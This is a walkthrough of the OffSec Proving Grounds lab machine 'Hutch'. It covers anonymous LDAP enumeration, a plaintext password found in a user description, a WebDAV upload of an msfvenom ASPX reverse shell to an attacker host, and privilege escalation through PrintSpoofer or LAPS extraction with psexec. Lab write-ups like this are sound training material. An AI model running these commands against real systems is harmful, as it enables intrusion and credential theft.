---
title: "PG: Hutch"
date: 2023-03-10
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/hutch/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - ldap
  - webdav
  - laps
  - printspoofer
  - active-directory
categories:
  - walkthrough
---

{{< box-info name="Hutch" os="Windows" difficulty="Medium" ip="192.168.160.122" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Full nmap output" >}}
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec.)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec.)
3269/tcp open  tcpwrapped
```
{{< /collapse >}}

This is a Windows Server 2019 domain controller (`hutch.offsec`).

### Port 80 - IIS + WebDAV

Nmap and Nikto both confirm **WebDAV is enabled** with PUT, DELETE, MOVE, LOCK, UNLOCK methods. The web root is the default IIS page.

WebDAV upload requires authentication -- can't upload anonymously.

### Port 389 - LDAP (NULL Bind)

LDAP allows **anonymous/NULL bind**. We can dump the entire directory:

```bash
ldapsearch -x -H ldap://192.168.160.122 -D '' -w '' -b "DC=hutch,DC=offsec"
```

Extracted AD users:

```
rplacidi, opatry, ltaunton, acostello, jsparwell,
oknee, jmckendry, avictoria, jfrarey, eaburrow,
cluddy, agitthouse, fmcsorley
```

{{< callout type="flag" >}}
Freddy McSorley's LDAP `description` field contains a password in plaintext:
`Password set to CrabSharkJellyfish192 at user's request. Please change on next login.`
{{< /callout >}}

Credentials: `fmcsorley:CrabSharkJellyfish192`

---

## Foothold

### WebDAV Shell Upload

With valid credentials, we can upload an ASPX reverse shell to the IIS web root via WebDAV:

```bash
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.160 LPORT=139 -f aspx > shell.aspx

# Upload via curl with creds
curl -T shell.aspx http://192.168.160.122/ -v -u fmcsorley:CrabSharkJellyfish192

# Trigger it
curl http://192.168.160.122/shell.aspx -v
```

{{< callout type="warning" >}}
Don't go down the Kerberos rabbit hole (AS-REP roasting, etc.) -- the attack path is WebDAV, not Kerberos.
{{< /callout >}}

---

## Privilege Escalation

Two viable vectors here:

### Vector 1: PrintSpoofer

Our user has `SeImpersonatePrivilege`. Upload and run [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) for SYSTEM.

### Vector 2: LAPS Password Extraction

LAPS is installed and enabled on the target:

![LAPS installed](/images/hutch/laps.png)

Since `fmcsorley` can read the LAPS password attribute, query LDAP for the local Administrator password:

```bash
ldapsearch -x -H ldap://192.168.160.122 \
  -D 'CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec' \
  -w 'CrabSharkJellyfish192' \
  -b "DC=hutch,DC=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

Then use `psexec` with the extracted Administrator password:

```bash
psexec.py hutch.offsec/Administrator:'<extracted_password>'@192.168.160.122
```

![psexec shell](/images/hutch/psexec.png)

---

## Proof

{{< terminal title="proof" >}}
local.txt: [redacted]
proof.txt: [redacted]
{{< /terminal >}}

![Root proof](/images/hutch/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- Always test for **LDAP NULL bind** on domain controllers -- it can leak credentials stored in user description fields
- Don't ignore WebDAV when it shows up in nmap -- authenticated file upload to a web root is a direct path to code execution
- LAPS password extraction via LDAP is a clean privesc when the user has read permissions on `ms-MCS-AdmPwd`
- `SeImpersonatePrivilege` + PrintSpoofer is always a reliable fallback on Windows
{{< /callout >}}
